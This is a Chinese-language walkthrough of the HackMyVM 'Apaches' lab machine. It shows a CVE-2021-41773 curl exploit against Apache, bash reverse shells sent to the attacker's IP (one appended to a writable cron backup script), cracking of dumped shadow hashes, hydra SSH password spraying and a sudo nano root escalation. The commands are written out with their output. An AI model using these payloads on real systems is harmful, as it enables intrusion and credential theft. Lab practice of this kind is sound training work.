# hmv_Apaches

# 0. 简介

**靶机**：[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
**难度**：绿色
**目标 IP**：192.168.205.143
**本机 IP**：192.168.205.141

# 1. 扫描

首先，通过 `nmap` 对靶机进行全端口扫描，检查开放端口和服务：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
Nmap scan report for 192.168.205.143
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

从扫描结果可以看到，靶机开启了 **SSH** 和 **HTTP** 服务。接下来，我们对 HTTP 服务进行进一步的渗透测试。

# 2. 漏洞扫描与利用

通过访问 Web 服务，未发现明显的漏洞。因此，我使用 **feroxbuster** 对靶机进行目录爆破，虽然未获得有效的目录列表，但继续使用 `nuclei` 工具对靶机进行漏洞扫描，最终发现了一个高危漏洞：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u 192.168.205.143
...
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
...
[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773):RCE] [http] [high] http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
...
```

该漏洞为 **[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773)**，是 Apache HTTP 服务器的目录遍历漏洞，能够通过访问特定路径执行命令。

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

执行成功后，获取了靶机的基本信息，进一步确认漏洞有效。现在我们执行反弹shell。

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; bash -c "bash -i >& /dev/tcp/192.168.205.141/8888 0>&1"'

#kali
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 60584
bash: cannot set terminal process group (651): Inappropriate ioctl for device
bash: no job control in this shell
daemon@apaches:/usr/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

# 3. 获取稳定的 Shell

为了获取一个更加稳定的交互式 shell，执行以下命令：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

这些操作确保了与靶机的连接更为稳定，并为后续的渗透操作提供了良好的基础。

# 4.提权

```bash
daemon@apaches:/usr/bin$ cd /home/
daemon@apaches:/home$ ls -al
total 24
drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
daemon@apaches:/home$ cd geronimo/
daemon@apaches:/home/geronimo$ ls -al
total 32
drwxr-xr-x 4 geronimo geronimo 4096 Jul 13  2023 .
drwxr-xr-x 6 root     root     4096 Oct  9  2022 ..
-rw------- 1 geronimo geronimo    0 Jul 13  2023 .bash_history
-rw-r--r-- 1 geronimo geronimo  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 geronimo geronimo 3771 Feb 25  2020 .bashrc
drwx------ 2 geronimo geronimo 4096 Sep 30  2022 .cache
drwxrwxr-x 3 geronimo geronimo 4096 Oct 10  2022 .local
-rw-r--r-- 1 geronimo geronimo  807 Feb 25  2020 .profile
-rw-r--r-- 1 geronimo geronimo    0 Oct  1  2022 .sudo_as_admin_successful
-rw------- 1 geronimo geronimo 3827 Oct 10  2022 user.txt
daemon@apaches:/home/geronimo$ cd ..
daemon@apaches:/home$ cd pocahontas/
daemon@apaches:/home/pocahontas$ ls -al
total 36
drwxr-xr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .
drwxr-xr-x 6 root       root        4096 Oct  9  2022 ..
-rw------- 1 pocahontas pocahontas     0 Oct 10  2022 .bash_history
-rw-r--r-- 1 pocahontas pocahontas   220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 pocahontas pocahontas  3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .local
-rw-r--r-- 1 pocahontas pocahontas   807 Oct  9  2022 .profile
-rw------- 1 pocahontas pocahontas 10267 Oct 10  2022 user.txt
daemon@apaches:/home/pocahontas$ cd ..
daemon@apaches:/home$ cd sacagawea/
daemon@apaches:/home/sacagawea$ ls -la
total 48
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 .
drwxr-xr-x 6 root      root      4096 Oct  9  2022 ..
-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local
-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile
-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor
drwxrwxr-x 2 sacagawea sacagawea 4096 Jan 22 06:06 Backup
drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts
-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13  2023 user.txt
daemon@apaches:/home/sacagawea$ cd Backup/
daemon@apaches:/home/sacagawea/Backup$ ls -al
total 23128
drwxrwxr-x 2 sacagawea sacagawea     4096 Jan 22 06:06 .
drwxr-xr-x 6 sacagawea sacagawea     4096 Jul 13  2023 ..
-rwx------ 1 sacagawea sacagawea 23673389 Jan 22 06:06 Backup.tar.gz
daemon@apaches:/home/sacagawea/Backup$ cd ..
daemon@apaches:/home/sacagawea$ cd Development/
daemon@apaches:/home/sacagawea/Development$ ls -al
total 68
drwxrwxr-x 7 sacagawea sacagawea  4096 Oct 10  2022 .
drwxr-xr-x 6 sacagawea sacagawea  4096 Jul 13  2023 ..
drwx------ 2 sacagawea sacagawea  4096 Oct  6  2022 admin
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 css
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 fonts
drwxrwxr-x 4 sacagawea sacagawea  4096 Oct 10  2022 images
-rwxrwxr-x 1 sacagawea sacagawea 33940 Oct 10  2022 index.html
drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 js
-rwxrwxr-x 1 sacagawea sacagawea   116 Oct 10  2022 robots.txt
daemon@apaches:/home/sacagawea/Development$ cd ..
daemon@apaches:/home/sacagawea$ cd ..
daemon@apaches:/home$ ls -al
total 24
drwxr-xr-x  6 root       root       4096 Oct  9  2022 .
drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
daemon@apaches:/home$ cd squanto/
daemon@apaches:/home/squanto$ ls -al
total 36
drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 6 root    root    4096 Oct  9  2022 ..
-rw------- 1 squanto squanto    0 Oct 10  2022 .bash_history
-rw-r--r-- 1 squanto squanto  220 Oct  9  2022 .bash_logout
-rw-r--r-- 1 squanto squanto 3771 Oct  9  2022 .bashrc
drwxrwxr-x 3 squanto squanto 4096 Oct  9  2022 .local
-rw-r--r-- 1 squanto squanto  807 Oct  9  2022 .profile
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 backup
-rw-rw-r-- 1 squanto squanto  156 Oct 10  2022 todo.md
-rw------- 1 squanto squanto 2070 Oct  9  2022 user.txt
daemon@apaches:/home/squanto$ cat backup/
cat: backup/: Is a directory
daemon@apaches:/home/squanto$ cd backup/ 
daemon@apaches:/home/squanto/backup$ ls -al
total 8
drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 .
drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 ..
daemon@apaches:/home/squanto/backup$ c d..
c: command not found
daemon@apaches:/home/squanto/backup$ cd ..
daemon@apaches:/home/squanto$ cat todo.md  
### Development

- [x] Apaches frontpage
- [ ] Portal for administration
- [ ] Database selection for administration
- [ ] Hardening the system for attacks
daemon@apaches:/home/squanto$ cd /opt/ 
daemon@apaches:/opt$ ls --la
ls: unrecognized option '--la'
Try 'ls --help' for more information.
daemon@apaches:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Apr 23  2020 .
drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
daemon@apaches:/opt$ cd /tmp/
daemon@apaches:/tmp$ ls -al
total 44
drwxrwxrwt 11 root root 4096 Jan 22 06:04 .
drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .ICE-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .Test-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .X11-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .XIM-unix
drwxrwxrwt  2 root root 4096 Jan 22 05:58 .font-unix
drwx------  3 root root 4096 Jan 22 05:58 snap-private-tmp
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-logind.service-62l80f
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-resolved.service-U7wK0h
drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-timesyncd.service-6HVyEh

daemon@apaches:/tmp$ wget 192.168.205.141/linpeas.sh
--2025-01-22 06:10:32--  http://192.168.205.141/linpeas.sh
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 824847 (806K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================>] 805.51K  --.-KB/s    in 0.02s   

2025-01-22 06:10:32 (49.1 MB/s) - 'linpeas.sh' saved [824847/824847]

daemon@apaches:/tmp$ chmod +x linpeas.sh 
daemon@apaches:/tmp$ bash linpeas.sh 
═╣ Can I read shadow files? ............. root:*:18375:0:99999:7:::                                                                
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:19265:0:99999:7:::
systemd-coredump:!!:19265::::::
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
lxd:!:19265::::::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::                                                                                                                                  
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No                                                                                       
═╣ Can I read opasswd file? ............. No                                                                                       
═╣ Can I write in network-scripts? ...... No                                                                                       
═╣ Can I read root folder? .............. No                   
```

我去......我是没想到它`/etc/shadow`是可读的。我们将数据提取出来爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat hash
geronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
squanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
sacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
pocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::

┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamtheone        (squanto)   
1g 0:00:02:02 6.84% (ETA: 14:47:27) 0.008181g/s 9123p/s 27696c/s 27696C/s 14032519..1234victor
Use the "--show" option to display all of the cracked passwords reliably
Session aborted

```

我们登录上去，继续提权

```bash
squanto@apaches:/home/sacagawea$ id
uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
squanto@apaches:/home/sacagawea$ find / -group Lipan 2>/dev/null
/home/sacagawea/Scripts/backup.sh
squanto@apaches:/home/sacagawea$ cd /home/sacagawea/Scripts/
squanto@apaches:/home/sacagawea/Scripts$ ls -al
total 12
drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 .
drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 ..
-rwxrwx--- 1 sacagawea Lipan      182 Oct 10  2022 backup.sh
squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
```

有一个脚本文件，看着就像定时任务，而且我们可以修改，我们加个反弹shell上去

```bash
squanto@apaches:/home/sacagawea/Scripts$ echo "bash -c 'bash -i >& /dev/tcp/192.168.205.141/8889 0>&1'" >> backup.sh 
squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
#!/bin/bash

rm -rf /home/sacagawea/Backup/Backup.tar.gz
tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
chmod 700 /home/sacagawea/Backup/Backup.tar.gz
bash -c 'bash -i >& /dev/tcp/192.168.205.141/8889 0>&1'
```

我们稍等片刻

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8889                                
listening on [any] 8889 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 50796
bash: cannot set terminal process group (48786): Inappropriate ioctl for device
bash: no job control in this shell
sacagawea@apaches:~$ id
uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
```

继续提权

```bash
sacagawea@apaches:~$ cd Development/
sacagawea@apaches:~/Development$ ls
ls
admin
css
fonts
images
index.html
js
robots.txt
sacagawea@apaches:~/Development$ cd admin/
sacagawea@apaches:~/Development/admin$ ls
ls
1a-login.php
1b-login.css
2-check.php
3-protect.php
sacagawea@apaches:~/Development/admin$ cat 2-check.php 
<?php
// (A) START SESSION
session_start();

// (B) HANDLE LOGIN
if (isset($_POST["user"]) && !isset($_SESSION["user"])) {
  // (B1) USERS & PASSWORDS - SET YOUR OWN !
  $users = [
    "geronimo" => "12u7D9@4IA9uBO4pX9#6jZ3456",
    "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl",
    "squanto" => "4Rl3^K8WDG@sG24Hq@ih",
    "sacagawea" => "cU21X8&uGswgYsL!raXC"
  ];

  // (B2) CHECK & VERIFY
  if (isset($users[$_POST["user"]])) {
    if ($users[$_POST["user"]] == $_POST["password"]) {
      $_SESSION["user"] = $_POST["user"];
    }
  }

  // (B3) FAILED LOGIN FLAG
  if (!isset($_SESSION["user"])) { $failed = true; }
}

// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
if (isset($_SESSION["user"])) {
  header("Location: index.php");
  exit();
}
```

发现了几组用户和密码，我们尝试利用其爆破ssh

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat user              
geronimo
pocahontas
squanto
sacagawea
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ cat pass
12u7D9@4IA9uBO4pX9#6jZ3456
y2U1@8Ie&OHwd^Ww3uAl
4Rl3^K8WDG@sG24Hq@ih
cU21X8&uGswgYsL!raXC

┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P pass ssh://192.168.205.143 -V -I -u -f -e nsr -t 64

[22][ssh] host: 192.168.205.143   login: pocahontas   password: y2U1@8Ie&OHwd^Ww3uAl
[STATUS] attack finished for 192.168.205.143 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 14:32:09

```

我们通过ssh连接上去（建议这样连接，不要要上一个用户切用户，不然它sudo会报错）

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh pocahontas@192.168.205.143

pocahontas@apaches:~$ sudo -l
Matching Defaults entries for pocahontas on apaches:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pocahontas may run the following commands on apaches:
    (geronimo) /bin/nano
```

![Image](https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e)

可以使用**sudo nano**，我们进行提权

```bash
pocahontas@apaches:~$ sudo -u geronimo /bin/nano
$ bash
geronimo@apaches:/home/pocahontas$ sudo bash -p
root@apaches:/home/pocahontas# id
uid=0(root) gid=0(root) groups=0(root)
```